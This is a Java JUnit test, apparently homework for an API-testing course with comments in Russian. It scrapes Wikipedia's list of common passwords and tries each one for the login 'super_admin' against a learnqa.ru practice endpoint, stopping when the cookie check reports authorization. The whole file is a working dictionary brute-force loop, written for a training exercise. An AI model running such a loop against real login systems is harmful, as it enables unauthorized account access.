import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.junit.jupiter.api.Test;
import java.io.IOException;
import java.util.*;
import java.util.stream.Collectors;


public class Password {
    /*
     * Используем библиотеку Jsoup для получения таблицы со странички Wiki
     */
    @Test
    public void testPassword() throws IOException {
        String authCookie = "You are authorized";

        Document doc =  Jsoup
                .connect("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
                .userAgent("Chrome/81.0.4044.138")
                .get();
        Element table = doc.select("table").get(1);
        Elements rows = table.select("td");
        HashSet<String> passwords = new HashSet<>();
        for (int i = 1; i < rows.size(); i++) {
            Element row = rows.get(i);                 //по номеру индекса получает строку
            Elements cols = row.select("td"); // разбиваем полученную строку по тегу на столбы
            passwords.add(cols.get(0).text());
        }
        List<String> result = passwords.stream().filter(s -> s.length() > 2).collect(Collectors.toList()); //Список популярных паролей со страницы wiki

        /*
         * Полученный список паролей помещаем в Мап-у params
         */
        Map<String, String> params = new HashMap<>();
        for (String s : result) {
            params.put("login", "super_admin");
            params.put("password", s);

        /*
         * Получаем все куки, правильные и неправильные
         * POST-запрос с двумя параметрами: login и password
         */
            Response responseGetCookie = RestAssured
                    .given()
                    .body(params)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String auth_cookie = responseGetCookie.getCookie("auth_cookie");
            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", auth_cookie);

        /*
         * Перебираем куки, пока метод не вернет фразу "You are authorized".
         */
            Response responseForAuth = RestAssured
                    .given()
                    .cookies(cookies)
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            String expectedPhrase = responseForAuth.asString();

            if (expectedPhrase.equals(authCookie)){
                System.out.printf("Верный пароль: %s\n", s);
                System.out.println(expectedPhrase);
                break;
            }
        }
    }
}